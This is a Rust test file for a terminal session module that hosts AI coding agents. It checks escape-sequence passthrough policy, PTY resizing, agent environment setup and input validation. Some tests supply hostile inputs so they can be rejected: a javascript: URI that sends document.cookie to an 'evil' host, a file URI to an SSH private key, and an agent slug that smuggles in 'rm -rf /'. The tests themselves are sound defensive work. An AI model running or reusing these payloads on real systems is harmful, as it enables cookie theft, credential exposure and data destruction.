//! Tests for `session`.
use super::*;

use portable_pty::{ChildKiller, MasterPty, PtySize};

// ── PTY test doubles ───────────────────────────────────────────────────────
// Sessions need a master PTY and a child killer; these no-op doubles let a
// test feed synthetic PTY output through `feed_pty` without spawning a child.

#[derive(Debug)]
struct NullChildKiller;

impl ChildKiller for NullChildKiller {
    fn kill(&mut self) -> std::io::Result<()> {
        Ok(())
    }
    fn clone_killer(&self) -> Box<dyn ChildKiller + Send + Sync> {
        Box::new(Self)
    }
}

struct NullMasterPty;

impl MasterPty for NullMasterPty {
    fn resize(&self, _size: PtySize) -> Result<()> {
        Ok(())
    }
    fn get_size(&self) -> Result<PtySize> {
        Ok(PtySize {
            rows: 24,
            cols: 80,
            pixel_width: 0,
            pixel_height: 0,
        })
    }
    fn try_clone_reader(&self) -> Result<Box<dyn std::io::Read + Send>> {
        Ok(Box::new(std::io::empty()))
    }
    fn take_writer(&self) -> Result<Box<dyn std::io::Write + Send>> {
        Ok(Box::new(std::io::sink()))
    }
    #[cfg(unix)]
    fn process_group_leader(&self) -> Option<nix::libc::pid_t> {
        None
    }
    #[cfg(unix)]
    fn as_raw_fd(&self) -> Option<portable_pty::unix::RawFd> {
        None
    }
    #[cfg(unix)]
    fn tty_name(&self) -> Option<std::path::PathBuf> {
        None
    }
}

/// Master PTY double that records the last `PtySize` handed to `resize`, so a
/// test can assert what `TIOCSWINSZ` the agent's PTY actually received. Only
/// `resize` differs from the inert double; the other (external-trait) methods
/// delegate to an inner `NullMasterPty` rather than re-stubbing them.
struct RecordingMasterPty {
    inner: NullMasterPty,
    last_size: Arc<Mutex<Option<PtySize>>>,
}

impl MasterPty for RecordingMasterPty {
    fn resize(&self, size: PtySize) -> Result<()> {
        if let Ok(mut slot) = self.last_size.lock() {
            *slot = Some(size);
        }
        Ok(())
    }
    fn get_size(&self) -> Result<PtySize> {
        self.inner.get_size()
    }
    fn try_clone_reader(&self) -> Result<Box<dyn std::io::Read + Send>> {
        self.inner.try_clone_reader()
    }
    fn take_writer(&self) -> Result<Box<dyn std::io::Write + Send>> {
        self.inner.take_writer()
    }
    #[cfg(unix)]
    fn process_group_leader(&self) -> Option<nix::libc::pid_t> {
        self.inner.process_group_leader()
    }
    #[cfg(unix)]
    fn as_raw_fd(&self) -> Option<portable_pty::unix::RawFd> {
        self.inner.as_raw_fd()
    }
    #[cfg(unix)]
    fn tty_name(&self) -> Option<std::path::PathBuf> {
        self.inner.tty_name()
    }
}

fn test_session_with_policy(policy: OscPolicy) -> Session {
    let (input_tx, _input_rx) = mpsc::unbounded_channel();
    let mut session = Session::new_for_test(
        "Test".to_owned(),
        Some("codex".to_owned()),
        None,
        (24, 80),
        100,
        input_tx,
        Arc::new(Mutex::new(Box::new(NullMasterPty))),
        Arc::new(Mutex::new(Box::new(NullChildKiller))),
    );
    session.osc_policy = policy;
    session
}

#[test]
fn resize_floors_pty_winsize_to_at_least_one() {
    // A collapsed pane can hand `Session::resize` a 0-row (or 0-col) geometry.
    // The agent PTY must never receive a 0×0 `TIOCSWINSZ` — programs expect
    // ≥1 — and each axis must floor independently, not collapse to 1×1.
    let last_size = Arc::new(Mutex::new(None));
    let (input_tx, _input_rx) = mpsc::unbounded_channel();
    let mut session = Session::new_for_test(
        "Test".to_owned(),
        Some("codex".to_owned()),
        None,
        (24, 80),
        100,
        input_tx,
        Arc::new(Mutex::new(Box::new(RecordingMasterPty {
            inner: NullMasterPty,
            last_size: Arc::clone(&last_size),
        }))),
        Arc::new(Mutex::new(Box::new(NullChildKiller))),
    );

    let recorded = || {
        last_size
            .lock()
            .ok()
            .and_then(|slot| *slot)
            .expect("resize must drive the PTY")
    };

    session.resize(0, 80);
    let size = recorded();
    assert_eq!(
        (size.rows, size.cols),
        (1, 80),
        "0 rows floored to 1, cols kept"
    );

    session.resize(24, 0);
    let size = recorded();
    assert_eq!(
        (size.rows, size.cols),
        (24, 1),
        "0 cols floored to 1, rows kept"
    );
}

#[test]
fn feed_pty_does_not_accumulate_scroll_ops() {
    // feed_pty clears recorded scroll ops each chunk so they cannot grow
    // unbounded while the scroll-region optimizer that would consume them is
    // deferred.
    let mut burst = Vec::new();
    for i in 0..200 {
        burst.extend_from_slice(format!("line {i}\r\n").as_bytes());
    }
    // Guard against a vacuous pass: confirm the burst genuinely records scroll
    // ops, so the clear assertion below would fail if recording ever stopped or
    // the clear ran before process().
    let mut probe = jackin_term::DamageGrid::new(24, 80, 100);
    probe.process(&burst);
    assert!(
        !probe.drain_scroll_ops().is_empty(),
        "burst must record scroll ops for the clear assertion to be meaningful"
    );
    // feed_pty runs the same process() then clear_scroll_ops(); after it
    // returns the buffer must already be empty.
    let mut session = test_session_with_policy(OscPolicy::default());
    session.feed_pty(&burst);
    assert!(
        session.shadow_grid.drain_scroll_ops().is_empty(),
        "feed_pty must clear recorded scroll ops each chunk"
    );
}

/// Feed `bytes` through a default-policy session and return the
/// forwardable passthrough byte sequences (post-policy filter).
fn drained(bytes: &[u8]) -> Vec<Vec<u8>> {
    let mut session = test_session_with_policy(OscPolicy::default());
    session.feed_pty(bytes);
    session.drain_passthrough()
}

fn drained_with_policy(bytes: &[u8], policy: OscPolicy) -> Vec<Vec<u8>> {
    let mut session = test_session_with_policy(policy);
    session.feed_pty(bytes);
    session.drain_passthrough()
}

// ── OSC and unhandled-CSI passthrough contracts ───────────────────────────
// Every OSC the agent emits must reach the attached client when (and only
// when) the focused-pane policy allows it. The grid emits typed events; the
// session applies `OscPolicy` and re-encodes the forwardable bytes.

#[test]
fn osc_52_clipboard_write_is_re_emitted() {
    let drained = drained(b"\x1b]52;c;SGVsbG8=\x07");
    assert_eq!(drained.len(), 1);
    let s = &drained[0];
    assert!(s.starts_with(b"\x1b]52;"));
    assert!(s.windows(8).any(|w| w == b"SGVsbG8="));
}

#[test]
fn osc_2_window_title_is_re_emitted_and_captured() {
    let mut session = test_session_with_policy(OscPolicy::default());
    session.feed_pty(b"\x1b]2;Claude (working)\x07");
    assert_eq!(
        session.title(),
        Some("Claude (working)"),
        "title not captured"
    );
    let drained = session.drain_passthrough();
    assert_eq!(drained.len(), 1);
    assert!(drained[0].starts_with(b"\x1b]0;") || drained[0].starts_with(b"\x1b]2;"));
}

#[test]
fn osc_8_hyperlink_is_modeled_not_re_emitted() {
    let mut session = test_session_with_policy(OscPolicy::default());
    session.feed_pty(b"\x1b]8;;https://example/\x07text\x1b]8;;\x07");
    let drained = session.drain_passthrough();
    assert!(
        drained.is_empty(),
        "OSC 8 must not be raw passthrough: {drained:?}"
    );
    let snap = session.shadow_grid.dump();
    assert_eq!(
        snap.cell(0, 0)
            .and_then(|cell| cell.hyperlink_uri.as_deref()),
        Some("https://example/")
    );
    assert_eq!(
        snap.cell(0, 4)
            .and_then(|cell| cell.hyperlink_uri.as_deref()),
        None
    );
}

#[test]
fn osc_9_notification_is_re_emitted() {
    let drained = drained(b"\x1b]9;build finished\x07");
    assert_eq!(drained.len(), 1);
    let s = String::from_utf8_lossy(&drained[0]);
    assert!(s.contains("9;build finished"));
}

#[test]
fn osc_7_cwd_is_captured_and_percent_decoded() {
    let mut session = test_session_with_policy(OscPolicy::default());
    session.feed_pty(b"\x1b]7;file://localhost/Users/alice/My%20Code\x07");
    assert_eq!(
        session.cwd(),
        Some("/Users/alice/My Code"),
        "OSC 7 must percent-decode and strip the host"
    );
    // OSC 7 must NEVER be forwarded to the outer terminal.
    assert!(
        session.drain_passthrough().is_empty(),
        "OSC 7 must not reach the outer terminal"
    );
}

#[test]
fn osc_7_rejects_malformed_payload() {
    let mut session = test_session_with_policy(OscPolicy::default());
    session.feed_pty(b"\x1b]7;random-text\x07");
    assert!(session.cwd().is_none());
}

#[test]
fn kitty_kb_stack_tracks_push_and_pop() {
    let mut session = test_session_with_policy(OscPolicy::default());
    session.feed_pty(b"\x1b[>1u\x1b[>3u");
    assert_eq!(session.shadow_grid.kitty_kb_flags(), 3);
    session.feed_pty(b"\x1b[<1u");
    assert_eq!(session.shadow_grid.kitty_kb_flags(), 1);
    session.feed_pty(b"\x1b[<5u"); // over-pop bounded by stack length
    assert_eq!(session.shadow_grid.kitty_kb_flags(), 0);
}

#[test]
fn focus_events_flag_tracks_dec_1004() {
    let mut session = test_session_with_policy(OscPolicy::default());
    session.feed_pty(b"\x1b[?1004h");
    assert!(session.focus_events_enabled());
    session.feed_pty(b"\x1b[?1004l");
    assert!(!session.focus_events_enabled());
}

#[test]
fn title_and_cwd_updates_track_latest_values() {
    // Derived rendering: chrome state is read fresh every frame, so the
    // session only retains the latest title/cwd — no dirty flag.
    let mut session = test_session_with_policy(OscPolicy::default());
    assert!(session.title().is_none());

    session.feed_pty(b"\x1b]2;prompt title\x07");
    assert_eq!(session.title(), Some("prompt title"));

    session.feed_pty(b"\x1b]7;file:///workspace/project\x07");
    assert_eq!(session.cwd(), Some("/workspace/project"));
}

#[test]
fn unhandled_csi_kitty_keyboard_push_is_forwarded() {
    // The grid emits the canonical push bytes; the session forwards them
    // verbatim while tracking the stack for focus-swap restore.
    let drained = drained(b"\x1b[>1u");
    assert!(
        drained.iter().any(|f| f == b"\x1b[>1u"),
        "kitty push must reach the outer terminal: {drained:?}"
    );
}

#[test]
fn unhandled_csi_xterm_window_reports_are_suppressed() {
    // `CSI ... t` is xterm's window manipulation / reporting family;
    // forwarding it lets the host terminal's reply land in a shell pane.
    let drained = drained(b"\x1b[18t\x1b[14t\x1b[16t\x1b[8;40;135t");
    assert!(
        drained.iter().all(|f| !f.ends_with(b"t")),
        "xterm window reports must not reach the outer terminal: {drained:?}"
    );
}

#[test]
fn unhandled_csi_modify_other_keys_is_re_emitted() {
    let drained = drained(b"\x1b[>4;2m");
    assert!(
        drained.iter().any(|f| f == b"\x1b[>4;2m"),
        "drained: {drained:?}"
    );
}

#[test]
fn agent_synchronized_output_toggles_are_absorbed() {
    // The capsule's own frame brackets supersede the agent's BSU/ESU; a
    // forwarded `?2026h` whose matching `l` is dropped froze the outer
    // terminal (D6), so the grid absorbs both toggles.
    for toggle in [&b"\x1b[?2026h"[..], &b"\x1b[?2026l"[..]] {
        let drained = drained(toggle);
        assert!(
            drained.is_empty(),
            "agent ?2026 toggles must never reach the outer terminal: {drained:?}"
        );
    }
}

#[test]
fn known_csi_does_not_double_emit() {
    // Cursor positioning `\x1b[5;3H` is handled by the grid; it must not be
    // re-emitted as passthrough (which would duplicate the cursor move).
    let drained = drained(b"\x1b[5;3H");
    assert!(
        drained.iter().all(|f| !f.ends_with(b"H")),
        "grid-handled CSI leaked through: {drained:?}"
    );
}

#[test]
fn drain_returns_empty_when_no_passthrough_emitted() {
    let drained = drained(b"plain text without any escape sequences");
    assert!(drained.is_empty());
}

#[test]
fn osc_52_clipboard_dropped_when_policy_denies() {
    let drained = drained_with_policy(b"\x1b]52;c;SGVsbG8=\x07", OscPolicy::for_test_deny_all());
    assert!(
        drained.is_empty(),
        "OSC 52 leaked under deny policy: {drained:?}"
    );
}

#[test]
fn osc_9_notification_dropped_when_policy_denies() {
    let drained = drained_with_policy(b"\x1b]9;build finished\x07", OscPolicy::for_test_deny_all());
    assert!(
        drained.is_empty(),
        "OSC 9 leaked under deny policy: {drained:?}"
    );
}

#[test]
fn osc_2_title_dropped_when_policy_denies() {
    let drained = drained_with_policy(b"\x1b]2;rogue title\x07", OscPolicy::for_test_deny_all());
    assert!(
        drained.is_empty(),
        "OSC 2 leaked under deny policy: {drained:?}"
    );
}

#[test]
fn osc_8_hyperlink_dropped_when_policy_denies() {
    let drained = drained_with_policy(
        b"\x1b]8;;https://example/\x07text\x1b]8;;\x07",
        OscPolicy::for_test_deny_all(),
    );
    assert!(
        drained.is_empty(),
        "OSC 8 leaked under deny policy: {drained:?}"
    );
}

#[test]
fn osc_8_unsafe_scheme_dropped_even_when_policy_allows() {
    // A `javascript:` URI must never reach the host terminal regardless of
    // the operator's hyperlink policy.
    let drained = drained(b"\x1b]8;;javascript:alert(1)\x07");
    assert!(
        drained
            .iter()
            .all(|f| !f.windows(b"javascript".len()).any(|w| w == b"javascript")),
        "unsafe OSC 8 scheme leaked: {drained:?}"
    );
}

#[test]
fn drain_clears_pending_between_calls() {
    let mut session = test_session_with_policy(OscPolicy::default());
    session.feed_pty(b"\x1b]52;c;AAAA\x07");
    let first = session.drain_passthrough();
    assert_eq!(first.len(), 1);
    let second = session.drain_passthrough();
    assert!(
        second.is_empty(),
        "drain must clear pending; got {second:?}"
    );
}

#[test]
fn build_agent_command_overrides_stale_agent_env() {
    let env = vec![("JACKIN_AGENT".to_owned(), "claude".to_owned())];
    let cmd = build_agent_command("codex", None, &env, Path::new("/workspace"), "test");

    assert_eq!(
        cmd.get_env("JACKIN_AGENT").and_then(|value| value.to_str()),
        Some("codex")
    );
}

#[test]
fn build_agent_command_uses_stable_pane_term() {
    let env = vec![("TERM".to_owned(), "xterm-ghostty".to_owned())];
    let cmd = build_agent_command("codex", None, &env, Path::new("/workspace"), "test");

    assert_eq!(
        cmd.get_env("TERM").and_then(|value| value.to_str()),
        Some("xterm-256color")
    );
}

#[test]
fn build_agent_command_advertises_truecolor() {
    let env = vec![("COLORTERM".to_owned(), "24bit".to_owned())];
    let cmd = build_agent_command("claude", None, &env, Path::new("/workspace"), "test");

    assert_eq!(
        cmd.get_env("COLORTERM").and_then(|value| value.to_str()),
        Some("truecolor")
    );
}

#[test]
fn build_shell_command_advertises_truecolor() {
    let env = vec![("COLORTERM".to_owned(), "false".to_owned())];
    let cmd = build_shell_command(&env, Path::new("/workspace"), "test");

    assert_eq!(
        cmd.get_env("COLORTERM").and_then(|value| value.to_str()),
        Some("truecolor")
    );
}

#[test]
fn agent_model_args_match_cli_contracts() {
    assert_eq!(
        agent_model_args("claude", Some("sonnet")),
        vec!["--model", "sonnet"]
    );
    assert_eq!(
        agent_model_args("codex", Some("gpt-5")),
        vec!["-m", "gpt-5"]
    );
    assert_eq!(
        agent_model_args("kimi", Some("kimi-k2")),
        vec!["--model", "kimi-k2"]
    );
    assert_eq!(
        agent_model_args("opencode", Some("zai/glm")),
        vec!["-m", "zai/glm"]
    );
    assert_eq!(
        agent_model_args("grok", Some("grok-build-0.1")),
        vec!["-m", "grok-build-0.1"]
    );
    assert!(agent_model_args("amp", None).is_empty());
    assert!(agent_model_args("amp", Some("ignored")).is_empty());
}

#[test]
fn build_shell_command_removes_stale_agent_env() {
    let env = vec![("JACKIN_AGENT".to_owned(), "claude".to_owned())];
    let cmd = build_shell_command(&env, Path::new("/workspace"), "test");

    assert!(cmd.get_env("JACKIN_AGENT").is_none());
}

#[test]
fn pty_output_does_not_change_state() {
    // The old flap engine flipped state on every PTY byte (Idle→Working) and
    // could not hold a blocked dialog through its own repaint. After Phase 2,
    // PTY output updates recency only and never authors state.
    let mut session = test_session_with_policy(OscPolicy::default());
    session.state = AgentState::Blocked;
    let before = session.last_output_at;
    session.feed_pty(b"\x1b[2K some redrawn dialog frame\r\n");
    assert_eq!(
        session.state,
        AgentState::Blocked,
        "PTY output must not author state"
    );
    assert!(
        session.last_output_at >= before,
        "PTY output still updates recency evidence"
    );
}

#[test]
fn operator_input_does_not_change_state() {
    // A keystroke inside a blocked dialog used to flip Blocked→Working and
    // re-notify. After Phase 2 it updates the input timestamp and reports
    // whether it cleared a latched blocker, but never authors state.
    let mut session = test_session_with_policy(OscPolicy::default());

    session.state = AgentState::Blocked;
    assert!(session.mark_operator_input(), "reports it was blocked");
    assert_eq!(
        session.state,
        AgentState::Blocked,
        "operator input must not author state"
    );

    session.state = AgentState::Done;
    assert!(!session.mark_operator_input());
    assert_eq!(
        session.state,
        AgentState::Done,
        "operator input must not author state"
    );
}

#[test]
fn redraw_soak_produces_zero_state_transitions() {
    // The flap engine produced a Blocked↔Working flip on every redraw frame.
    // Replaying a permission-dialog repaint many times must now yield zero
    // state changes at the session level. (The real single Blocked transition
    // arrives with the Phase 3/8 evidence pipeline; this guards that redraws
    // alone never author state — the regression that motivated this work.)
    let mut session = test_session_with_policy(OscPolicy::default());
    let start = session.state;
    let frame =
        b"\x1b[2K\x1b[1;1H Do you want to proceed?\r\n  1. Yes\r\n  2. No\r\n  esc to cancel\r\n";
    let mut transitions = 0;
    let mut prev = start;
    for _ in 0..150 {
        session.feed_pty(frame);
        if session.state != prev {
            transitions += 1;
            prev = session.state;
        }
    }
    assert_eq!(
        transitions, 0,
        "redraws must not author any state transition"
    );
    assert_eq!(session.state, start);
}

#[test]
fn opencode_event_sets_complete_authority() {
    use crate::agent_status::evidence::{AuthorityGrade, RawAgentState};
    let mut session = test_session_with_policy(OscPolicy::default());
    let now = std::time::Instant::now();
    session.apply_runtime_event("hook-opencode-1", "opencode", "permission.asked", now);
    let a = session.authority.as_ref().expect("authority set");
    assert_eq!(a.source_id, "hook-opencode-1");
    assert_eq!(a.mapped_state, RawAgentState::Blocked);
    assert!(a.pending_permission);
    assert_eq!(a.grade, AuthorityGrade::Complete);
    assert!(!a.direct_state_report);
}

#[test]
fn claude_event_never_sets_authority() {
    // Decision 0a: Claude/Codex are identity-only; their events never produce
    // a semantic authority — state comes from the screen pack + watchdog.
    let mut session = test_session_with_policy(OscPolicy::default());
    session.apply_runtime_event("hook-claude-1", "claude", "Stop", std::time::Instant::now());
    assert!(session.authority.is_none());
}

#[test]
fn clear_event_drops_authority_for_source() {
    let mut session = test_session_with_policy(OscPolicy::default());
    let now = std::time::Instant::now();
    session.apply_runtime_event("hook-opencode-1", "opencode", "tool.execute.before", now);
    assert!(session.authority.is_some());
    session.apply_runtime_event("hook-opencode-1", "opencode", "session.error", now);
    assert!(session.authority.is_none());
}

#[test]
fn osc_title_captured_and_capped() {
    let mut session = test_session_with_policy(OscPolicy::default());
    let long = "x".repeat(400);
    session.feed_pty(format!("\x1b]2;{long}\x07").as_bytes());
    let osc = session.osc_evidence();
    assert_eq!(
        osc.title.as_ref().map(|t| t.chars().count()),
        Some(256),
        "title retained and capped at 256 chars"
    );
    assert!(osc.title_changed_at.is_some());
}

#[test]
fn osc9_notification_sets_notify_edge() {
    let mut session = test_session_with_policy(OscPolicy::default());
    session.feed_pty(b"\x1b]9;build done\x07");
    assert!(session.osc_evidence().notify_edge_at.is_some());
    assert!(!session.osc_evidence().progress_active);
}

#[test]
fn osc94_progress_active_then_clear() {
    let mut session = test_session_with_policy(OscPolicy::default());
    session.feed_pty(b"\x1b]9;4;1;50\x07");
    assert!(
        session.osc_evidence().progress_active,
        "OSC 9;4 state 1 marks progress active"
    );
    session.feed_pty(b"\x1b]9;4;0\x07");
    assert!(!session.osc_evidence().progress_active);
    assert!(session.osc_evidence().progress_cleared_at.is_some());
}

#[test]
fn osc133_marks_set_shell_state() {
    use crate::agent_status::evidence::RawAgentState;
    let mut session = test_session_with_policy(OscPolicy::default());
    session.feed_pty(b"\x1b]133;C\x07");
    assert_eq!(
        session.osc_evidence().shell_state,
        Some(RawAgentState::Working)
    );
    session.feed_pty(b"\x1b]133;B\x07");
    assert_eq!(
        session.osc_evidence().shell_state,
        Some(RawAgentState::Idle)
    );
}

#[test]
fn process_evidence_unavailable_without_child_pid() {
    // Test sessions have no real child PID; sampling must report "no physics"
    // (never a false exit), so the watchdog can't demote off this evidence.
    let mut session = test_session_with_policy(OscPolicy::default());
    let ev = session.sample_process_evidence(std::time::Instant::now());
    assert!(!ev.physics_sampled);
    assert!(!ev.process_exited);
    assert!(!ev.foreground_is_agent);
}

#[test]
fn clear_runtime_authority_drops_state_and_counters() {
    let mut session = test_session_with_policy(OscPolicy::default());
    session.apply_runtime_event(
        "hook-opencode-1",
        "opencode",
        "permission.asked",
        std::time::Instant::now(),
    );
    assert!(session.authority.is_some());
    session.clear_runtime_authority();
    assert!(session.authority.is_none());
    assert_eq!(session.subagents_active, 0);
}

#[test]
fn agent_session_gets_status_reporter_env() {
    let mut cmd = CommandBuilder::new("/bin/true");
    inject_status_env(&mut cmd, 42, Some("codex"));
    let get = |k| cmd.get_env(k).and_then(|v| v.to_str());
    assert_eq!(get("JACKIN_SESSION_ID"), Some("42"));
    assert_eq!(get("JACKIN_AGENT_RUNTIME"), Some("codex"));
    assert_eq!(get("JACKIN_STATUS_SOURCE"), Some("hook-codex-42"));
    assert_eq!(get("JACKIN_STATUS_SOCKET"), Some("/jackin/run/jackin.sock"));
}

#[test]
fn shell_session_gets_only_status_socket() {
    let mut cmd = CommandBuilder::new("/bin/zsh");
    inject_status_env(&mut cmd, 7, None);
    assert!(cmd.get_env("JACKIN_SESSION_ID").is_none());
    assert!(cmd.get_env("JACKIN_AGENT_RUNTIME").is_none());
    assert!(cmd.get_env("JACKIN_STATUS_SOURCE").is_none());
    assert_eq!(
        cmd.get_env("JACKIN_STATUS_SOCKET").and_then(|v| v.to_str()),
        Some("/jackin/run/jackin.sock")
    );
}

#[test]
fn osc8_uri_empty_is_safe() {
    // Empty URI = link terminator; must always pass.
    assert!(osc8_uri_is_safe(""));
}

#[test]
fn osc8_uri_http_https_mailto_pass() {
    assert!(osc8_uri_is_safe("http://example.com"));
    assert!(osc8_uri_is_safe("https://example.com"));
    assert!(osc8_uri_is_safe("HTTPS://EXAMPLE.COM"));
    assert!(osc8_uri_is_safe("mailto:foo@example.com"));
}

#[test]
fn osc8_uri_unsafe_schemes_rejected() {
    // The threat scenarios the allowlist is here to block.
    assert!(!osc8_uri_is_safe(
        "javascript:fetch('//evil/?'+document.cookie)"
    ));
    assert!(!osc8_uri_is_safe("file:///Users/operator/.ssh/id_rsa"));
    assert!(!osc8_uri_is_safe(
        "data:text/html,<script>alert(1)</script>"
    ));
    assert!(!osc8_uri_is_safe("ssh://server"));
}

#[test]
fn validate_agent_slug_rejects_typical_attacks() {
    let supported = Vec::new();
    assert!(validate_agent_slug("", &supported).is_err());
    assert!(validate_agent_slug("--debug", &supported).is_err());
    assert!(validate_agent_slug("claude\n; rm -rf /", &supported).is_err());
    assert!(validate_agent_slug("claude codex", &supported).is_err());
    assert!(validate_agent_slug("claude\0", &supported).is_err());
}

#[test]
fn validate_agent_slug_accepts_well_formed_slug_when_no_allowlist() {
    let supported = Vec::new();
    assert!(validate_agent_slug("claude", &supported).is_ok());
    assert!(validate_agent_slug("codex", &supported).is_ok());
}

#[test]
fn validate_agent_slug_rejects_slug_outside_launch_config_allowlist() {
    let supported = vec!["claude".to_owned()];
    assert!(validate_agent_slug("claude", &supported).is_ok());
    assert_eq!(
        validate_agent_slug("codex", &supported).unwrap_err(),
        "not in launch config allowlist"
    );
}

// ── exit-reason classification ────────────────────────────────────────────
// `child_exit_reason` drives whether a session exit surfaces as a Shutdown
// reason (operator-facing error) or a clean teardown. A regression that
// reported `Some(..)` on a clean exit would turn every normal `/exit` into a
// spurious error dialog + container teardown notice.

#[test]
fn child_exit_reason_clean_exit_is_none() {
    let status = portable_pty::ExitStatus::with_exit_code(0);
    assert_eq!(child_exit_reason(Ok(&status)), None);
}

#[test]
fn child_exit_reason_nonzero_code_reports_code() {
    let status = portable_pty::ExitStatus::with_exit_code(137);
    assert_eq!(
        child_exit_reason(Ok(&status)).as_deref(),
        Some("session process exited with code 137")
    );
}

#[test]
fn child_exit_reason_signal_reports_signal() {
    let status = portable_pty::ExitStatus::with_signal("SIGKILL");
    assert_eq!(
        child_exit_reason(Ok(&status)).as_deref(),
        Some("session process exited after signal SIGKILL")
    );
}

#[test]
fn child_exit_reason_wait_error_reports_failure() {
    let err = std::io::Error::other("boom");
    let reason = child_exit_reason(Err(&err)).expect("a wait error must yield a reason");
    assert!(reason.starts_with("session process wait failed:"));
    assert!(reason.contains("boom"));
}

// ── diagnostic tail ───────────────────────────────────────────────────────

#[test]
fn diagnostic_tail_zero_rows_is_none() {
    let session = test_session_with_policy(OscPolicy::default());
    assert_eq!(session.diagnostic_tail(0), None);
}

#[test]
fn diagnostic_tail_blank_pane_is_none() {
    let session = test_session_with_policy(OscPolicy::default());
    assert_eq!(session.diagnostic_tail(12), None);
}

#[test]
fn diagnostic_tail_returns_last_nonblank_rows_oldest_first() {
    let mut session = test_session_with_policy(OscPolicy::default());
    session.feed_pty(b"alpha\r\nbravo\r\ncharlie\r\n");
    let tail = session
        .diagnostic_tail(2)
        .expect("rendered rows must yield a tail");
    assert_eq!(tail, "bravo\ncharlie");
}
